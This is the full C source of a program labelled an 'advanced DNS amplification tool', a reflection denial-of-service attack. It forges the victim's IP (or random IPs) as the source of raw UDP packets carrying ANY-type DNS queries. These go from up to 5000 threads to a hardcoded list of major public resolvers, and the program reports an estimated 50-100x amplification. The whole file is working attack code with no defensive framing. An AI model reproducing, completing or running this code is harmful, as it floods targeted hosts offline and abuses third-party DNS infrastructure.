#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <time.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <atomic>

#define MAX_THREADS 5000
#define STATUS_UPDATE_INTERVAL 2
#define DNS_QUERY_SIZE 128
#define MAX_DNS_SERVERS 100
#define MAX_DOMAINS 5
#define PACKETS_PER_SECOND 9000

typedef struct {
    int thread_id;
    std::atomic_ulong *packet_count;
    volatile int *running;
    char dns_server[16];
    char target_ip[16];
    int port;
    int query_id;
    int spoof_random_ip;
} thread_data_t;

typedef struct {
    char target_ip[16];
    int port;
    int duration;
    int thread_count;
    volatile int running;
    std::atomic_ulong total_packets;
    char dns_servers[MAX_DNS_SERVERS][16];
    int dns_server_count;
    int spoof_random_ip;
} config_t;

config_t config;

struct dns_header {
    unsigned short id;
    unsigned short flags;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
};

void print_banner(void);
void init_config(int argc, char *argv[]);
void validate_arguments(void);
void setup_signal_handlers(void);
void handle_signal(int sig);
void print_status(std::atomic_ulong *packet_counts, int thread_count);
void *dns_amplification_thread(void *arg);
unsigned long get_time_ms(void);
void load_dns_servers(void);
unsigned short checksum(unsigned short *ptr, int nbytes);
void generate_random_ip(char *ip);
void select_random_domain(char *qname, size_t qname_size);

void print_banner(void) {
    printf("=========================================\n");
    printf("    ADVANCED DNS AMPLIFICATION TOOL\n");
    printf("=========================================\n");
}

void init_config(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <TARGET_IP> <PORT> <DURATION> [THREADS] [RANDOM_IP]\n", argv[0]);
        printf("Example: %s 192.168.1.100 53 60 1000 1\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_ip[sizeof(config.target_ip) - 1] = '\0';
    config.port = atoi(argv[2]);
    config.duration = atoi(argv[3]);
    config.thread_count = (argc > 4) ? atoi(argv[4]) : 1000;
    config.spoof_random_ip = (argc > 5) ? atoi(argv[5]) : 0;
    config.running = 0;
    std::atomic_init(&config.total_packets, 0UL);
    config.dns_server_count = 0;
    
    load_dns_servers();
}

void load_dns_servers(void) {
    const char *servers[] = {
        "8.8.8.8", "8.8.4.4",
        "1.1.1.1", "1.0.0.1",
        "9.9.9.9", "149.112.112.112",
        "208.67.222.222", "208.67.220.220",
        "64.6.64.6", "64.6.65.6",
        "84.200.69.80", "84.200.70.40",
        "8.26.56.26", "8.20.247.20",
        "195.46.39.39", "195.46.39.40",
        "77.88.8.8", "77.88.8.1",
        "176.103.130.130", "176.103.130.131",
        "156.154.70.1", "156.154.71.1",
        "185.228.168.9", "185.228.169.9",
        "76.76.19.19", "76.223.122.150",
        "94.140.14.14", "94.140.15.15",
        "4.2.2.1", "4.2.2.2", "4.2.2.3", "4.2.2.4", "4.2.2.5", "4.2.2.6"
    };
    
    int count = sizeof(servers) / sizeof(servers[0]);
    for (int i = 0; i < count && i < MAX_DNS_SERVERS; i++) {
        strncpy(config.dns_servers[i], servers[i], sizeof(config.dns_servers[i]) - 1);
        config.dns_servers[i][sizeof(config.dns_servers[i]) - 1] = '\0';
        config.dns_server_count++;
    }
    
    printf("[+] Loaded %d DNS servers\n", config.dns_server_count);
}

void validate_arguments(void) {
    if (config.duration < 1) {
        fprintf(stderr, "Error: Duration must be at least 1 second\n");
        exit(EXIT_FAILURE);
    }
    
    if (config.thread_count < 1 || config.thread_count > MAX_THREADS) {
        fprintf(stderr, "Error: Thread count must be between 1 and %d\n", MAX_THREADS);
        exit(EXIT_FAILURE);
    }
    
    if (config.port < 1 || config.port > 65535) {
        fprintf(stderr, "Error: Port must be between 1 and 65535\n");
        exit(EXIT_FAILURE);
    }
    
    struct in_addr addr;
    if (inet_pton(AF_INET, config.target_ip, &addr) != 1) {
        fprintf(stderr, "Error: Invalid target IP address format\n");
        exit(EXIT_FAILURE);
    }
}

void setup_signal_handlers(void) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
}

void handle_signal(int sig) {
    printf("\n[!] Received signal %d, shutting down...\n", sig);
    config.running = 0;
}

void print_status(std::atomic_ulong *packet_counts, int thread_count) {
    static int update_count = 0;
    unsigned long total = 0;
    
    for (int i = 0; i < thread_count; i++) {
        total += std::atomic_load(&packet_counts[i]);
    }
    
    time_t now = time(NULL);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    printf("[%s][%02d] Total amplified packets: %lu | Current PPS: %.2f\n", 
           timestamp, ++update_count, total, (float)total / ((update_count) * STATUS_UPDATE_INTERVAL));
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

void generate_random_ip(char *ip) {
    snprintf(ip, 16, "%d.%d.%d.%d", 
             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

void select_random_domain(char *qname, size_t qname_size) {
    const char *domains[] = {
        "\x06" "google" "\x03" "com" "\x00",
        "\x07" "youtube" "\x03" "com" "\x00",
        "\x08" "facebook" "\x03" "com" "\x00",
        "\x06" "amazon" "\x03" "com" "\x00",
        "\x07" "twitter" "\x03" "com" "\x00"
    };
    int index = rand() % MAX_DOMAINS;
    size_t len = strlen(domains[index]) + 1;
    if (len > qname_size) {
        fprintf(stderr, "Error: Domain name too long for buffer\n");
        len = qname_size - 1;
    }
    strncpy(qname, domains[index], len);
    qname[len] = '\0';
}

void *dns_amplification_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "Thread %d: Raw socket creation failed: %s\n", data->thread_id, strerror(errno));
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "Thread %d: setsockopt failed: %s\n", data->thread_id, strerror(errno));
        close(sock);
        return NULL;
    }
    
    char dns_query[DNS_QUERY_SIZE];
    struct dns_header *dns_hdr = (struct dns_header *)dns_query;
    
    dns_hdr->id = htons(data->query_id);
    dns_hdr->flags = htons(0x0100);
    dns_hdr->qdcount = htons(1);
    dns_hdr->ancount = 0;
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;
    
    char *qname = dns_query + sizeof(struct dns_header);
    select_random_domain(qname, DNS_QUERY_SIZE - sizeof(struct dns_header));
    
    unsigned short *qtype = (unsigned short *)(qname + strlen(qname) + 1);
    *qtype = htons(0x00ff);
    unsigned short *qclass = qtype + 1;
    *qclass = htons(0x0001);
    
    int query_len = sizeof(struct dns_header) + strlen(qname) + 1 + 4;
    
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    memcpy(payload, dns_query, query_len);
    
    udp->source = htons(1024 + (rand() % 64512));
    udp->dest = htons(data->port);
    udp->len = htons(sizeof(struct udphdr) + query_len);
    udp->check = 0;
    
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + query_len;
    ip->id = htons(data->query_id);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(data->port);
    sin.sin_addr.s_addr = inet_addr(data->dns_server);
    
    struct timespec sleep_time;
    sleep_time.tv_sec = 0;
    sleep_time.tv_nsec = (1000000000 / PACKETS_PER_SECOND);
    
    while (*(data->running)) {
        dns_hdr->id = htons(rand() % 65535);
        ip->id = htons(rand() % 65535);
        
        char src_ip[16];
        if (data->spoof_random_ip) {
            generate_random_ip(src_ip);
            ip->saddr = inet_addr(src_ip);
        } else {
            ip->saddr = inet_addr(data->target_ip);
        }
        ip->daddr = inet_addr(data->dns_server);
        
        select_random_domain(qname, DNS_QUERY_SIZE - sizeof(struct dns_header));
        query_len = sizeof(struct dns_header) + strlen(qname) + 1 + 4;
        memcpy(payload, dns_query, query_len);
        udp->len = htons(sizeof(struct udphdr) + query_len);
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + query_len;
        
        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
        
        if (sendto(sock, packet, ip->tot_len, 0, 
                  (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            std::atomic_fetch_add(data->packet_count, 1);
        } else {
            fprintf(stderr, "Thread %d: sendto failed: %s\n", data->thread_id, strerror(errno));
        }
        
        nanosleep(&sleep_time, NULL);
    }
    
    close(sock);
    return NULL;
}

unsigned long get_time_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (ts.tv_sec * 1000) + (ts.tv_nsec / 1000000);
}

int main(int argc, char *argv[]) {
    pthread_t *threads = NULL;
    thread_data_t *thread_data = NULL;
    std::atomic_ulong *packet_counts = NULL;
    unsigned long start_time, current_time, elapsed_time;
    
    print_banner();
    init_config(argc, argv);
    validate_arguments();
    setup_signal_handlers();
    
    printf("[+] Target: %s:%d\n", config.target_ip, config.port);
    printf("[+] Duration: %d seconds\n", config.duration);
    printf("[+] Threads: %d\n", config.thread_count);
    printf("[+] DNS Servers: %d\n", config.dns_server_count);
    printf("[+] Random IP Spoofing: %s\n", config.spoof_random_ip ? "Enabled" : "Disabled");
    printf("[+] Starting DNS amplification attack...\n\n");
    
    threads = (pthread_t *)malloc(config.thread_count * sizeof(pthread_t));
    thread_data = (thread_data_t *)malloc(config.thread_count * sizeof(thread_data_t));
    packet_counts = (std::atomic_ulong *)malloc(config.thread_count * sizeof(std::atomic_ulong));
    
    if (!threads || !thread_data || !packet_counts) {
        perror("Memory allocation failed");
        free(threads);
        free(thread_data);
        free(packet_counts);
        return EXIT_FAILURE;
    }
    
    for (int i = 0; i < config.thread_count; i++) {
        std::atomic_init(&packet_counts[i], 0UL);
    }
    
    srand(time(NULL));
    for (int i = 0; i < config.thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].packet_count = &packet_counts[i];
        thread_data[i].running = &config.running;
        thread_data[i].query_id = rand() % 65535;
        thread_data[i].port = config.port;
        thread_data[i].spoof_random_ip = config.spoof_random_ip;
        
        strncpy(thread_data[i].dns_server, 
                config.dns_servers[i % config.dns_server_count],
                sizeof(thread_data[i].dns_server) - 1);
        thread_data[i].dns_server[sizeof(thread_data[i].dns_server) - 1] = '\0';
        
        strncpy(thread_data[i].target_ip, config.target_ip, sizeof(thread_data[i].target_ip) - 1);
        thread_data[i].target_ip[sizeof(thread_data[i].target_ip) - 1] = '\0';
        
        if (pthread_create(&threads[i], NULL, dns_amplification_thread, (void*)&thread_data[i]) != 0) {
            fprintf(stderr, "Thread %d creation failed: %s\n", i, strerror(errno));
            for (int j = 0; j < i; j++) {
                pthread_cancel(threads[j]);
            }
            free(threads);
            free(thread_data);
            free(packet_counts);
            return EXIT_FAILURE;
        }
    }
    
    config.running = 1;
    start_time = get_time_ms();
    
    while (config.running) {
        sleep(STATUS_UPDATE_INTERVAL);
        print_status(packet_counts, config.thread_count);
        
        current_time = get_time_ms();
        elapsed_time = (current_time - start_time) / 1000;
        
        if (elapsed_time >= config.duration) {
            config.running = 0;
            break;
        }
    }
    
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long total_packets = 0;
    for (int i = 0; i < config.thread_count; i++) {
        total_packets += std::atomic_load(&packet_counts[i]);
    }
    
    printf("\n[+] Attack completed!\n");
    printf("[+] Total spoofed DNS queries sent: %lu\n", total_packets);
    printf("[+] Average queries per second: %.2f\n", (float)total_packets / config.duration);
    printf("[+] Estimated amplification: 50-100x (depending on DNS server)\n");
    
    free(threads);
    free(thread_data);
    free(packet_counts);
    
    return EXIT_SUCCESS;
}